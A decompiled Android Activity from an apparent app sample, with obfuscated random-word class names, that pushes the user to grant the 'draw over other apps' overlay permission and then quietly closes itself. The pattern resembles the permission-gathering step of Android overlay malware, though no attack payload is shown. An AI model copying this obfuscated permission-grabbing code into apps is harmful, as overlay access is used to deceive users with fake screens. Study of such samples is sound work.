package com.appser;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;
import com.appser.verapq.R;

public class gardenxgroundshsociologyoshowingqanthonytmsgwdaughtersediscountsgproblemnplcfhouseholdstchaino18 extends Activity {
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            if (Build.VERSION.SDK_INT < 23) {
                return;
            }
            if (!Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "Enable Draw over apps For : " + getString(R.string.ehvremainsq54), 1).show();
                startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + getPackageName())), 0);
                return;
            }
            finish();
        } catch (Exception unused) {
        }
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i != 0) {
            return;
        }
        if (i2 == -1) {
            finish();
        } else if (i2 == 0) {
            finish();
        }
    }

    public void finish() {
        safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.shown = false;
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }
}
